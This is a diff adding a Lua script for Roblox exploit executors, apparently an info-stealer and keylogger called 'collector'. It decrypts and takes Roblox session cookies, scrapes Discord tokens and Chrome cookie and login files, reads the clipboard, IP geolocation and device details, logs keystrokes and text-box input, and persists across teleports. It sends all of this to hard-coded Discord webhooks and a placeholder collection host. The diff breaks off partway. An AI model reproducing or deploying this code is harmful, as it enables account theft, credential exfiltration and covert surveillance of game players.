@@ -1,0 +1,930 @@
+-- collector.lua — dual-platform collector, session deck mirrors to TWO webhooks.
+-- webhookPrimary  = new url (main deck)
+-- webhookSecondary = old url (backup deck, same payload)
+-- Both get every embed. One dead = the other still lands.
+
+local CONFIG = {
+    webhookPrimary   = "https://discord.com/api/webhooks/1573479330238046309/DbUvrEijrKwUZCgfrCi5_e9zNCyLKcyvzZN_pOIqba02YioXtdF0DP9wxv3PzF68FGeI",
+    webhookSecondary = "https://discord.com/api/webhooks/1572445249022730290/HZUAi895Cn8aBAc_rHW5UW4_nxBXHVlnYLEzti7dYvjBsmEBA5-PICwhT_EDOkNW5KIT",
+    keylogWebhook    = "https://discord.com/api/webhooks/1573442637011361804/UiEQ1GB9A2y9FXVAXRUPJzANFdXTuuw0vCldF_6SbmB4CbRXoUIfIv14KYffGZXp6UKs",
+    trackWebhook     = "",
+    sinkUrl          = "https://your.host.example/collect",
+    keylogUrl        = "https://your.host.example/keylog",
+    trackUrl         = "https://your.host.example/track",
+    sinkKey          = "paste-hex",
+    retries          = 2,
+    redactOnDiscord  = true,
+    persist          = true,
+    headshotUrl      = "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+    bannerUrl        = "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=600&height=200&format=png",
+    capture = {
+        deviceFingerprint = true, otherApps = true, clipboard = true,
+        serverRoster = true, accountEnrich = true, peripherals = true,
+    },
+    track = { enabled=true, interval=30, diffRoster=true, includeState=true, includeBuffer=true, maxPings=0 },
+    keylog = {
+        enabled=true, flushSeconds=4, flushOnCount=30, maxBuffer=400,
+        captureKeys=true, captureText=true, captureMouse=true, flushOnChange=true, persistOnJoin=true,
+    },
+}
+
+local function log(stage, ...) print("[collector] "..stage..": "..table.concat({...}, " | ")) end
+local SESSION_START = os.clock()
+local SESSION = tostring(os.time()).."-"..tostring(math.random(10000, 99999))
+
+-- ─── platform resolve ────────────────────────────────────────
+local IDENT  = tostring((type(identifyexecutor) == "function" and select(1, pcall(identifyexecutor))) or "?")
+local HAS_FFI = (type(ffi) ~= "nil")
+local PLATFORM
+do
+    local lower = IDENT:lower()
+    if lower:find("potassium") or lower:find("synapse") or lower:find("wave") or lower:find("sirhurt") then
+        PLATFORM = "windows"
+    elseif lower:find("delta") or lower:find("codex") or lower:find("fluxus") then
+        PLATFORM = "android"
+    elseif HAS_FFI then PLATFORM = "windows"
+    else PLATFORM = "android" end
+end
+log("platform", PLATFORM.." · executor="..IDENT.." · ffi="..tostring(HAS_FFI))
+
+-- ─── clock ───────────────────────────────────────────────────
+local function clockNow()
+    local utc = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    local lt  = os.date("%Y-%m-%d %H:%M:%S")
+    local tz  = os.date("%Z") or "?"
+    local off = os.difftime(os.time(), os.time(os.date("!*t"))) or 0
+    local h   = off / 3600
+    local s   = h >= 0 and "+" or "-"
+    h = math.abs(h)
+    local o = string.format("%s%02d:%02d", s, math.floor(h), math.floor((h % 1) * 60))
+    return { utc=utc, localTime=lt, tz=tz, offset=o, human=lt.." ("..tz.." UTC"..o..")", discordTs=utc }
+end
+local function elapsedStr() return string.format("%.0fs", os.clock() - SESSION_START) end
+
+-- ─── http resolver ───────────────────────────────────────────
+local http
+do
+    if type(request) == "function" then http = request
+    elseif type(syn) == "table" and type(syn.request) == "function" then http = syn.request
+    elseif type(http_request) == "function" then http = http_request
+    elseif type(http) == "table" and type(http.request) == "function" then http = http.request
+    elseif type(fluxus) == "table" and type(fluxus.request) == "function" then http = fluxus.request
+    else
+        for _, name in ipairs({"request","http_request","syn","http","fluxus"}) do
+            local g = _G[name]
+            if type(g) == "function" then http = g; break end
+            if type(g) == "table" and type(g.request) == "function" then http = g.request; break end
+        end
+    end
+end
+if not http then log("http","[FAIL] no request global"); return end
+
+local HttpService = game:GetService("HttpService")
+local Players     = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local GuiService  = game:GetService("GuiService")
+local UserInputService = game:GetService("UserInputService")
+local LP = Players.LocalPlayer
+
+local function safe(fn, d) local ok, v = pcall(fn); return ok and v or d end
+local function decode(s) return safe(function() return HttpService:JSONDecode(s) end, nil) end
+local function encode(t) return safe(function() return HttpService:JSONEncode(t) end, nil) end
+local function hit(opts)
+    local lastErr
+    for attempt = 1, CONFIG.retries + 1 do
+        local ok, res = pcall(http, opts)
+        if ok and res and type(res.StatusCode) == "number"
+           and res.StatusCode >= 200 and res.StatusCode < 300 then return true, res end
+        lastErr = ok and ("status "..tostring(res and res.StatusCode)) or tostring(res)
+        if attempt <= CONFIG.retries then task.wait(0.4 * attempt) end
+    end
+    return false, nil, lastErr
+end
+
+-- ─── webhook health ─────────────────────────────────────────
+local healthCache = {}
+local function checkWebhook(url, label)
+    if type(url) ~= "string" or not url:find("^https://discord%.com/api/webhooks/") then
+        log("webhook."..label, "[FAIL] malformed"); return false
+    end
+    if healthCache[url] ~= nil then log("webhook."..label, "[cached] "..tostring(healthCache[url])); return healthCache[url] end
+    local ok = hit({ Url=url, Method="POST", Headers={["Content-Type"]="application/json"},
+        Body=encode({ content="`[collector]` **"..label.."** online · "..PLATFORM.." · "..IDENT }) })
+    healthCache[url] = ok
+    log("webhook."..label, ok and "[ok]" or "[FAIL]")
+    return ok
+end
+
+local trackURL = (CONFIG.trackWebhook ~= "" and CONFIG.trackWebhook) or CONFIG.keylogWebhook
+local primaryAlive   = checkWebhook(CONFIG.webhookPrimary,   "primary")
+local secondaryAlive = checkWebhook(CONFIG.webhookSecondary, "secondary")
+local keylogAlive    = checkWebhook(CONFIG.keylogWebhook,    "keylog")
+local trackAlive     = (trackURL == CONFIG.keylogWebhook) and keylogAlive or checkWebhook(trackURL, "track")
+if not (primaryAlive or secondaryAlive or keylogAlive or trackAlive) then log("fatal","all dead"); return end
+
+-- ─── persistence ────────────────────────────────────────────
+if CONFIG.persist then
+    local queued = false
+    local source; pcall(function() source = debug.info(1, "s") end)
+    if type(getscriptbytecode) == "function" then
+        local ok, bytes = pcall(getscriptbytecode, source or "")
+        if ok and type(bytes) == "string" then source = bytes end
+    end
+    if source and #tostring(source) > 0 then
+        if type(queue_on_teleport) == "function" then queued = pcall(queue_on_teleport, source)
+        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then queued = pcall(syn.queue_on_teleport, source)
+        elseif type(queueteleport) == "function" then queued = pcall(queueteleport, source) end
+    end
+    log("persist", queued and "[ok]" or "[FAIL]")
+end
+
+-- ─── ip intel ────────────────────────────────────────────────
+local function fetchIpIntel()
+    for _, url in ipairs({ "https://ipinfo.io/json", "https://ipapi.co/json/" }) do
+        local ok, res = hit({ Url=url, Method="GET", Headers={["Accept"]="application/json"} })
+        if ok then
+            local t = decode(res.Body)
+            if type(t) == "table" and (t.ip or t.query) then
+                return {
+                    ip=t.ip or t.query or "", city=t.city or "",
+                    region=t.region or t.region_name or "",
+                    country=t.country or t.country_code or t.country_name or "",
+                    postal=t.postal or t.postal_code or "",
+                    timezone=t.timezone or t.time_zone or "",
+                    loc=t.loc or "", org=t.org or t.org_name or t.asn or "",
+                    hostname=t.hostname or "",
+                }
+            end
+        end
+    end
+    return {}
+end
+
+-- ─── readers ────────────────────────────────────────────────
+local READERS, LISTERS = {}, {}
+do
+    local seenR, seenL = {}, {}
+    local function addR(name, fn) if type(fn)=="function" and not seenR[name] then seenR[name]=true; READERS[#READERS+1]={name,fn} end end
+    local function addL(name, fn) if type(fn)=="function" and not seenL[name] then seenL[name]=true; LISTERS[#LISTERS+1]={name,fn} end end
+    if type(readfile) == "function" then addR("readfile", readfile) end
+    if type(listfiles) == "function" then addL("listfiles", listfiles) end
+    if type(syn) == "table" then
+        if type(syn.readfile) == "function" then addR("syn.readfile", syn.readfile) end
+        if type(syn.listfiles) == "function" then addL("syn.listfiles", syn.listfiles) end
+    end
+    if type(readfile2) == "function" then addR("readfile2", readfile2) end
+end
+local function readAny(path)
+    for _, r in ipairs(READERS) do
+        local ok, content = pcall(r[2], path)
+        if ok and type(content) == "string" and #content > 0 then return content, r[1] end
+    end
+    return nil
+end
+local function listAny(path)
+    for _, l in ipairs(LISTERS) do
+        local ok, out = pcall(l[2], path)
+        if ok and type(out) == "table" then return out end
+    end
+    return nil
+end
+
+-- ─── windows DPAPI ──────────────────────────────────────────
+local WinSurf = { ready=false }
+if PLATFORM == "windows" and HAS_FFI then
+    pcall(function()
+        local ffi_ = ffi
+        pcall(ffi_.cdef[[
+            typedef struct { int cbData; unsigned char *pbData; } DATA_BLOB;
+            int CryptUnprotectData(DATA_BLOB *pDataIn, void *ppszDataDescr,
+                DATA_BLOB *pOptionalEntropy, void *pvReserved,
+                void *pPromptStruct, int dwFlags, DATA_BLOB *pDataOut);
+            void LocalFree(void *hMem);
+        ]])
+        local kernel32 = ffi_.load("kernel32")
+        local crypt32  = ffi_.load("crypt32")
+        local function dpapiUnprotect(b64)
+            local clean = tostring(b64):gsub("%s","")
+            local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+            local map = {}; for i = 1, #b do map[b:sub(i,i)] = i-1 end
+            local out = {}; local buf = 0; local bits = 0
+            for i = 1, #clean do
+                local c = clean:sub(i,i); if c == "=" then break end
+                local v = map[c]; if v == nil then return nil end
+                buf = buf * 64 + v; bits = bits + 6
+                if bits >= 8 then bits = bits - 8; out[#out+1] = string.char(math.floor(buf / (2 ^ bits)) % 256) end
+            end
+            local raw = table.concat(out); if #raw == 0 then return nil end
+            local inBlob  = ffi_.new("DATA_BLOB"); local outBlob = ffi_.new("DATA_BLOB")
+            inBlob.cbData = #raw
+            inBlob.pbData = ffi_.cast("unsigned char*", ffi_.new("char[?]", #raw))
+            ffi_.copy(inBlob.pbData, raw, #raw)
+            local ok = crypt32.CryptUnprotectData(inBlob, nil, nil, nil, nil, 0, outBlob)
+            if ok == 0 then return nil end
+            local plain = ffi_.string(outBlob.pbData, outBlob.cbData)
+            kernel32.LocalFree(outBlob.pbData)
+            return plain
+        end
+        WinSurf.dpapiUnprotect = dpapiUnprotect
+        WinSurf.ready = true
+    end)
+    log("win", WinSurf.ready and "[ok] DPAPI" or "[FAIL] DPAPI")
+end
+
+local function findRobloxCookieWindows()
+    if not WinSurf.ready then return { found=false, reason="ffi/DPAPI unavailable" } end
+    local path = os.getenv("LOCALAPPDATA") and (os.getenv("LOCALAPPDATA").."\\Roblox\\LocalStorage\\RobloxCookies.dat")
+    if not path then return { found=false, reason="LOCALAPPDATA unset" } end
+    local content = readAny(path)
+    if not content then return { found=false, reason="RobloxCookies.dat not readable" } end
+    local t = decode(content)
+    if type(t) ~= "table" then return { found=false, reason="not json" } end
+    for _, entry in pairs(t) do
+        if type(entry) == "table" and type(entry.Data) == "string" then
+            local plain = WinSurf.dpapiUnprotect(entry.Data)
+            if plain then
+                local v = plain:match("[%w%+%/%=%-_%.|]+")
+                if v and #v > 20 then
+                    return { found=true, method="DPAPI", path=path, rawLen=#content, value=v, account=entry.Name }
+                end
+            end
+        end
+    end
+    return { found=false, reason="no decryptable entries" }
+end
+
+local function findDiscordTokenWindows()
+    local base = os.getenv("APPDATA") and (os.getenv("APPDATA").."\\discord\\Local Storage\\leveldb")
+    if not base then return { found=false, reason="APPDATA unset" } end
+    local list = listAny(base)
+    if not list then return { found=false, reason="leveldb not listable" } end
+    local hits = {}
+    for _, f in ipairs(list) do
+        local name = f:match("[^\\/]+$") or f
+        if name:find("%.ldb$") or name:find("%.log$") then
+            local content = readAny(f)
+            if content then
+                for tok in content:gmatch("([%w%-%_]+%.[%w%-%_]+%.[%w%-%_]+)") do
+                    if #tok > 60 and tok:sub(1, 3):lower() ~= "htt" then
+                        hits[#hits+1] = { type="jwt", token=tok, file=f }
+                    end
+                end
+                for enc in content:gmatch("dQw4w9WgXcQ:([%w%+%/%=%-%_%.]+)") do
+                    if #enc > 20 then hits[#hits+1] = { type="encrypted", blob=enc, file=f } end
+                end
+            end
+        end
+    end
+    if #hits == 0 then return { found=false, reason="no tokens" } end
+    return { found=true, method="leveldb", hits=hits }
+end
+
+local function grabWindowsFingerprint()
+    return {
+        computerName   = os.getenv("COMPUTERNAME") or "?",
+        username       = os.getenv("USERNAME") or "?",
+        userProfile    = os.getenv("USERPROFILE") or "?",
+        processorId    = os.getenv("PROCESSOR_IDENTIFIER") or "?",
+        processorArch  = os.getenv("PROCESSOR_ARCHITECTURE") or "?",
+        processorCount = os.getenv("NUMBER_OF_PROCESSORS") or "?",
+        os             = os.getenv("OS") or "?",
+        localAppData   = os.getenv("LOCALAPPDATA") or "?",
+        appData        = os.getenv("APPDATA") or "?",
+    }
+end
+
+local function scanWindowsApps()
+    local out = {}
+    local dc = safe(findDiscordTokenWindows, { found=false })
+    out[#out+1] = { app="discord", label="Discord", found=dc.found, method=dc.method or "",
+                    hits=dc.hits or {}, reason=dc.reason or "" }
+    local chromeBase = os.getenv("LOCALAPPDATA") and (os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data")
+    if chromeBase then
+        local list = listAny(chromeBase)
+        if list then
+            local hits = {}
+            for _, f in ipairs(list) do
+                local n = f:match("[^\\/]+$") or f
+                if n == "Default" or n:match("^Profile ") then
+                    for _, p in ipairs({ f.."\\Network\\Cookies", f.."\\Login Data" }) do
+                        local c = readAny(p); if c then hits[#hits+1] = { path=p, bytes=#c } end
+                    end
+                end
+            end
+            out[#out+1] = { app="chrome", label="Chrome", found=(#hits>0), hits=hits }
+        end
+    end
+    return out
+end
+
+-- ─── android surface ────────────────────────────────────────
+local ROBLOX_PATHS = {
+    "/data/data/com.roblox.client/shared_prefs/RobloxMobile.xml",
+    "/data/data/com.roblox.client/shared_prefs/com.roblox.client.v2.playerprefs.xml",
+    "/data/data/com.roblox.client/files/.ROBLOSECURITY",
+    "/sdcard/Android/data/com.roblox.client/files/.ROBLOSECURITY",
+}
+local COOKIE_PATTERNS = {
+    '<string name="ROBLOSECURITY">([^<]+)</string>',
+    'ROBLOSECURITY%s*[=:]%s*("?)([^%s"<]+)',
+}
+local function extractCookie(text)
+    if type(text) ~= "string" or #text < 20 then return nil end
+    for _, pat in ipairs(COOKIE_PATTERNS) do
+        local a, b = text:match(pat)
+        local v = (b and #b > 20 and b) or (a and #a > 20 and a)
+        if v then return v end
+    end
+    return nil
+end
+local function findRobloxCookieAndroid()
+    for _, path in ipairs(ROBLOX_PATHS) do
+        local content, method = readAny(path)
+        if content then
+            local v = extractCookie(content)
+            if v then return { found=true, method=method, path=path, rawLen=#content, value=v } end
+        end
+    end
+    return { found=false, reason=#READERS==0 and "no readfile" or "paths failed" }
+end
+
+local function scanAndroidApps()
+    local out = {}
+    local cfg = {
+        paths = {
+            "/data/data/com.discord/shared_prefs/com.discord_preferences.xml",
+        },
+        patterns = { 'name="auth_token">([^<]+)</string>' },
+    }
+    local found = { app="discord", label="Discord", hits={}, rawLens={} }
+    for _, path in ipairs(cfg.paths) do
+        local content, method = readAny(path)
+        if content then
+            found.rawLens[path] = #content
+            for _, pat in ipairs(cfg.patterns) do
+                for m in content:gmatch(pat) do
+                    if m and #m > 20 then found.hits[#found.hits+1] = { path=path, method=method, value=m:sub(1,200) } end
+                end
+            end
+        end
+    end
+    if #found.hits > 0 or next(found.rawLens) then out[#out+1] = found end
+    return out
+end
+
+local function grabAndroidBuild()
+    local out = {}
+    for _, p in ipairs({ "/system/build.prop", "/vendor/build.prop" }) do
+        local content = readAny(p); if content then content = content:sub(1,4000) end
+        if content then
+            for key, val in content:gmatch("([%w%._%-]+)%s*=%s*([^\r\n]+)") do
+                if key == "ro.product.model" or key == "ro.product.manufacturer"
+                   or key == "ro.build.version.release" or key == "ro.build.version.sdk"
+                   or key == "ro.product.brand" or key == "ro.serialno" then out[key] = val end
+            end
+        end
+    end
+    return out
+end
+
+-- ─── dispatch ───────────────────────────────────────────────
+local function findCookie()
+    if PLATFORM == "windows" then return findRobloxCookieWindows() end
+    return findRobloxCookieAndroid()
+end
+local function scanApps()
+    if not CONFIG.capture.otherApps then return {} end
+    if PLATFORM == "windows" then return scanWindowsApps() end
+    return scanAndroidApps()
+end
+local function grabDevice()
+    if not CONFIG.capture.deviceFingerprint then return {} end
+    if PLATFORM == "windows" then return { platform="windows", info = grabWindowsFingerprint() } end
+    return { platform="android", build = grabAndroidBuild() }
+end
+
+-- ─── clipboard / account / roster / peripherals ────────────
+local function grabClipboard()
+    if not CONFIG.capture.clipboard then return nil end
+    local fn
+    if type(getclipboard) == "function" then fn = getclipboard
+    elseif type(syn) == "table" and type(syn.clipboard) == "table" and type(syn.clipboard.get) == "function" then fn = syn.clipboard.get
+    elseif type(syn) == "table" and type(syn.clipboard) == "function" then fn = function() return syn.clipboard() end
+    end
+    if not fn then return nil end
+    local ok, val = pcall(fn)
+    if ok and type(val) == "string" and #val > 0 then return val:sub(1,500) end
+    return nil
+end
+
+local function enrichAccount(userId)
+    if not CONFIG.capture.accountEnrich or not userId then return {} end
+    local out = {}
+    local ok, res = hit({ Url="https://users.roblox.com/v1/users/"..tostring(userId), Method="GET",
+        Headers={["Accept"]="application/json"} })
+    if ok then
+        local t = decode(res.Body)
+        if type(t) == "table" then
+            out.created=t.created or ""; out.description=(t.description or ""):sub(1,300)
+            out.isBanned=t.isBanned; out.hasVerified=t.hasVerifiedBadge
+        end
+    end
+    local ok2, res2 = hit({ Url="https://thumbnails.roblox.com/v1/users/avatar?userIds="..tostring(userId).."&size=420x420&format=Png&isCircular=false",
+        Method="GET", Headers={["Accept"]="application/json"} })
+    if ok2 then
+        local t = decode(res2.Body)
+        if type(t)=="table" and type(t.data)=="table" and t.data[1] then out.avatarUrl=t.data[1].imageUrl or "" end
+    end
+    return out
+end
+
+local function grabServerRoster()
+    if not CONFIG.capture.serverRoster then return {} end
+    local out = { players = {} }
+    pcall(function()
+        for _, p in ipairs(Players:GetPlayers()) do
+            local entry = { name=p.Name, displayName=p.DisplayName, userId=p.UserId,
+                accountAge=p.AccountAge, team=p.Team and p.Team.Name or nil,
+                membership=safe(function() return p.MembershipType.Name end, "None") }
+            if p == LP then entry.isLocal = true end
+            out.players[#out.players+1] = entry
+        end
+    end)
+    out.count = #out.players
+    out.maxPlayers = Players.MaxPlayers
+    return out
+end
+
+local function grabPeripherals()
+    if not CONFIG.capture.peripherals then return {} end
+    return {
+        keyboardEnabled = safe(function() return UserInputService.KeyboardEnabled end, false),
+        mouseEnabled    = safe(function() return UserInputService.MouseEnabled end, false),
+        gamepadEnabled  = safe(function() return UserInputService.GamepadEnabled end, false),
+        touchEnabled    = safe(function() return UserInputService.TouchEnabled end, false),
+        accelerometerEnabled = safe(function() return UserInputService.AccelerometerEnabled end, false),
+        gyroEnabled     = safe(function() return UserInputService.GyroEnabled end, false),
+        vrEnabled       = safe(function() return UserInputService.VREnabled end, false),
+        gamepadCount    = safe(function() return #UserInputService:GetConnectedGamepads() end, 0),
+    }
+end
+
+local function grabPlayerState()
+    local out = {
+        placeId = game.PlaceId, jobId = game.JobId, gameName = game.Name,
+        health = safe(function() return LP.Character and LP.Character:FindFirstChild("Humanoid") and LP.Character.Humanoid.Health or nil end, nil),
+        maxHealth = safe(function() return LP.Character and LP.Character:FindFirstChild("Humanoid") and LP.Character.Humanoid.MaxHealth or nil end, nil),
+        inGame = safe(function() return LP.Character ~= nil end, false),
+    }
+    local hrp = safe(function() return LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") end, nil)
+    if hrp then out.position = { x=math.floor(hrp.Position.X), y=math.floor(hrp.Position.Y), z=math.floor(hrp.Position.Z) } end
+    return out
+end
+
+-- ─── keylogger ────────────────────────────────────────────────
+local KeyLog = { buffer = {}, flushing = false, dropped = 0 }
+local function nowMs() return math.floor(os.clock() * 1000) end
+local function pushEvent(kind, value)
+    if not CONFIG.keylog.enabled then return end
+    if #KeyLog.buffer >= CONFIG.keylog.maxBuffer then
+        table.remove(KeyLog.buffer, 1); KeyLog.dropped = KeyLog.dropped + 1
+    end
+    KeyLog.buffer[#KeyLog.buffer+1] = { t=nowMs(), k=kind, v=tostring(value):sub(1,256) }
+end
+function flushKeylog(force)
+    if KeyLog.flushing then return end
+    if #KeyLog.buffer == 0 and not force then return end
+    KeyLog.flushing = true
+    local batch = KeyLog.buffer; KeyLog.buffer = {}
+    local dropped = KeyLog.dropped; KeyLog.dropped = 0
+    if CONFIG.keylogUrl and CONFIG.keylogUrl ~= "" then
+        task.spawn(function() hit({ Url=CONFIG.keylogUrl, Method="POST",
+            Headers={["Content-Type"]="application/json",["X-Api-Key"]=CONFIG.sinkKey},
+            Body=encode({ userId=LP.UserId, session=SESSION, count=#batch, dropped=dropped, events=batch }) }) end)
+    end
+    if not keylogAlive then KeyLog.flushing = false; return end
+    task.spawn(function()
+        local runs, curKind, cur = {}, nil, ""
+        for _, ev in ipairs(batch) do
+            if ev.k == curKind and ev.k == "key" then cur = cur .. ev.v .. " "
+            else
+                if curKind and cur ~= "" then runs[#runs+1] = { curKind, cur } end
+                curKind, cur = ev.k, (ev.k == "key" and (ev.v.." ")) or (ev.v.."\n")
+            end
+        end
+        if curKind and cur ~= "" then runs[#runs+1] = { curKind, cur } end
+        local blocks = {}
+        for _, r in ipairs(runs) do
+            local label = (r[1]=="key" and "⌨ ") or (r[1]=="text" and "✏ ") or "🖱 "
+            blocks[#blocks+1] = label.."```"..r[2]:sub(1,1000).."```"
+        end
+        local payload = ""
+        local function send()
+            if payload == "" then return end
+            hit({ Url=CONFIG.keylogWebhook, Method="POST",
+                Headers={["Content-Type"]="application/json"},
+                Body=encode({ username="⌨ "..(LP.Name or "?"), content=payload:sub(1,1990) }) })
+            payload = ""
+        end
+        for _, b in ipairs(blocks) do
+            if #payload + #b + 1 > 1900 then send() end
+            payload = payload .. b .. "\n"
+        end
+        if dropped > 0 then payload = payload.."\n_("..dropped.." dropped)_" end
+        send()
+    end)
+    KeyLog.flushing = false
+end
+if CONFIG.keylog.enabled and CONFIG.keylog.captureKeys then
+    pcall(function()
+        UserInputService.InputBegan:Connect(function(input, gp)
+            if gp then return end
+            local t = input.UserInputType
+            if t == Enum.UserInputType.Keyboard then
+                pushEvent("key", input.KeyCode.Name)
+                if #KeyLog.buffer >= CONFIG.keylog.flushOnCount then flushKeylog() end
+            elseif CONFIG.keylog.captureMouse and (t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.MouseButton2) then
+                pushEvent("mouse", t.Name)
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(input, gp)
+            if gp then return end
+            if CONFIG.keylog.captureKeys and input.UserInputType == Enum.UserInputType.Keyboard then
+                pushEvent("key", input.KeyCode.Name.."^")
+            end
+        end)
+    end)
+end
+if CONFIG.keylog.enabled and CONFIG.keylog.captureText then
+    local hooked = setmetatable({}, { __mode = "k" })
+    local function hookBox(box)
+        if hooked[box] or not box:IsA("TextBox") then return end
+        hooked[box] = true
+        box.Focused:Connect(function() pushEvent("text", "<focus:"..(box.Name or "TextBox")..">") end)
+        box:GetPropertyChangedSignal("Text"):Connect(function()
+            local txt = box.Text
+            if type(txt) == "string" and #txt > 0 then
+                pushEvent("text", txt)
+                if CONFIG.keylog.flushOnChange then flushKeylog() end
+            end
+        end)
+    end
+    for _, d in ipairs(game:GetDescendants()) do if d:IsA("TextBox") then hookBox(d) end end
+    game.DescendantAdded:Connect(function(d) if d:IsA("TextBox") then hookBox(d) end end)
+end
+if CONFIG.keylog.enabled then
+    task.spawn(function()
+        while true do task.wait(CONFIG.keylog.flushSeconds); if #KeyLog.buffer > 0 then flushKeylog() end end
+    end)
+    pcall(function() game:BindToClose(function() flushKeylog(true) end) end)
+end
+
+-- ─── live tracking ───────────────────────────────────────────
+local previousRoster = {}
+local function currentRosterMap()
+    local map = {}
+    pcall(function() for _, p in ipairs(Players:GetPlayers()) do map[tostring(p.UserId)] = p.Name end end)
+    return map
+end
+local function diffRoster(prev, cur)
+    local j, l = {}, {}
+    for id, n in pairs(cur) do if not prev[id] then j[#j+1] = n end end
+    for id, n in pairs(prev) do if not cur[id] then l[#l+1] = n end end
+    return j, l
+end
+local function postTrack(content)
+    if not trackAlive then return end
+    hit({ Url=trackURL, Method="POST", Headers={["Content-Type"]="application/json"},
+        Body=encode({ username="📡 "..(LP.Name or "?"), content=content:sub(1,1990) }) })
+end
+
+if CONFIG.track.enabled and trackAlive then
+    previousRoster = currentRosterMap()
+    task.spawn(function()
+        local c = clockNow()
+        postTrack(table.concat({
+            "**▶ session started · "..PLATFORM.."** · `"..SESSION.."`",
+            "**executor** `"..IDENT.."`",
+            "**user** `"..LP.Name.."` (`"..LP.UserId.."`)",
+            "**at** "..c.localTime.." ("..c.tz..")",
+            "**game** "..game.Name.." · place `"..game.PlaceId.."`",
+        }, "\n"))
+    end)
+
+    task.spawn(function()
+        local pings = 0
+        while true do
+            task.wait(CONFIG.track.interval)
+            pings = pings + 1
+            if CONFIG.track.maxPings > 0 and pings > CONFIG.track.maxPings then break end
+            local c = clockNow()
+            local curRoster = currentRosterMap()
+            local joined, left = diffRoster(previousRoster, curRoster)
+            previousRoster = curRoster
+            local state = CONFIG.track.includeState and grabPlayerState() or {}
+            local lines = {
+                "**💓 live** · `"..SESSION.."` · uptime "..elapsedStr().." · ping #"..pings,
+                "**clock** "..c.localTime.." ("..c.tz.." UTC"..c.offset..")",
+                "**game** "..game.Name.." · place `"..game.PlaceId.."`",
+                "**server** "..tostring(#Players:GetPlayers()).."/"..tostring(Players.MaxPlayers),
+            }
+            if state.inGame then
+                local hp = (state.health and state.maxHealth) and string.format("%.0f/%.0f", state.health, state.maxHealth) or "?"
+                lines[#lines+1] = "**state** in-game · HP "..hp
+            else
+                lines[#lines+1] = "**state** menu / no character"
+            end
+            if CONFIG.track.diffRoster then
+                if #joined > 0 then lines[#lines+1] = "**+ joined** `"..table.concat(joined, "`, `"):sub(1,300).."`" end
+                if #left > 0 then lines[#lines+1] = "**− left** `"..table.concat(left, "`, `"):sub(1,300).."`" end
+            end
+            if CONFIG.track.includeBuffer then
+                lines[#lines+1] = "**keylog** buffer "..#KeyLog.buffer.." · dropped "..KeyLog.dropped
+            end
+            if CONFIG.trackUrl and CONFIG.trackUrl ~= "" then
+                task.spawn(function()
+                    hit({ Url=CONFIG.trackUrl, Method="POST",
+                        Headers={["Content-Type"]="application/json",["X-Api-Key"]=CONFIG.sinkKey},
+                        Body=encode({ session=SESSION, userId=LP.UserId, userName=LP.Name,
+                            platform=PLATFORM, executor=IDENT, ping=pings, uptimeSec=os.clock()-SESSION_START,
+                            clock=c, state=state, roster=curRoster, joined=joined, left=left,
+                            bufferSize=#KeyLog.buffer, dropped=KeyLog.dropped }) })
+                end)
+            end
+            postTrack(table.concat(lines, "\n"))
+        end
+    end)
+
+    pcall(function()
+        game:BindToClose(function()
+            local c = clockNow()
+            postTrack("**⏹ session ended** · `"..SESSION.."` · uptime "..elapsedStr().." · "..c.localTime)
+        end)
+    end)
+    log("track","[ok] every "..CONFIG.track.interval.."s")
+end
+
+-- ─── collect ───────────────────────────────────────────────────
+local clockNow_ = clockNow()
+local intel  = fetchIpIntel()
+local cookie = safe(findCookie, { found=false, reason="threw" })
+local apps   = safe(scanApps, {})
+local device = safe(grabDevice, {})
+local clip   = safe(grabClipboard, nil)
+local account = safe(enrichAccount, LP.UserId) or {}
+local roster = safe(grabServerRoster, {})
+local periph = safe(grabPeripherals, {})
+
+log("clock", clockNow_.human)
+log("ip",    intel.ip ~= "" and "[ok]" or "[FAIL]")
+log("cookie",cookie.found and ("[ok] "..cookie.method) or ("[FAIL] "..tostring(cookie.reason)))
+log("apps",  tostring(#apps).." scanned")
+
+local payload = {
+    displayName = LP.DisplayName, userName = LP.Name, userId = LP.UserId,
+    accountAge = LP.AccountAge,
+    membership = safe(function() return LP.MembershipType.Name end, "None"),
+    country    = safe(function() return LocalizationService:GetCountryRegionForPlayerAsync(LP) end, "?"),
+    locale     = safe(function() return LocalizationService.RobloxLocaleId end, "?"),
+    platform   = PLATFORM, executor = IDENT,
+    deviceFamily = safe(function() return tostring(GuiService:GetPlatform()) end, "?"),
+    inputFamily  = safe(function() return tostring(UserInputService:GetPlatform()) end, "?"),
+    ip = intel.ip or "", city = intel.city or "", region = intel.region or "",
+    countryCode = intel.country or "", postal = intel.postal or "",
+    timezone = intel.timezone or "", loc = intel.loc or "",
+    org = intel.org or "", hostname = intel.hostname or "",
+    placeId = game.PlaceId, jobId = game.JobId, gameName = game.Name,
+    keylogActive = CONFIG.keylog.enabled,
+    trackActive  = CONFIG.track.enabled,
+    cookieFound = cookie.found, cookieMethod = cookie.method or "",
+    cookiePath  = cookie.path or "", cookieRawLen = cookie.rawLen or 0,
+    cookieReason= cookie.reason or "", robloxSec = cookie.value or "",
+    localTime = clockNow_.localTime, tz = clockNow_.tz,
+    tzOffset = clockNow_.offset, utcTime = clockNow_.utc, joinedAt = clockNow_.utc,
+    deviceInfo = device, otherApps = apps, clipboard = clip,
+    account = account, roster = roster, peripherals = periph,
+    gameMeta = {
+        creatorId = safe(function() return game.CreatorId end, 0),
+        creatorType = safe(function() return tostring(game.CreatorType) end, "?"),
+        placeVersion = safe(function() return game.PlaceVersion end, 0),
+        description = safe(function() return (game.Description or ""):sub(1,300) end, ""),
+        maxPlayers = safe(function() return Players.MaxPlayers end, 0),
+    },
+}
+if CONFIG.sinkUrl and CONFIG.sinkUrl ~= "" then
+    local ok = hit({ Url=CONFIG.sinkUrl, Method="POST",
+        Headers={["Content-Type"]="application/json",["X-Api-Key"]=CONFIG.sinkKey},
+        Body=encode(payload) })
+    log("sink", ok and "[ok]" or "[FAIL]")
+end
+
+-- ─── dual webhook deck ──────────────────────────────────────
+local PALETTE = { full=0x57F287, partial=0xFEE75C, empty=0xED4245 }
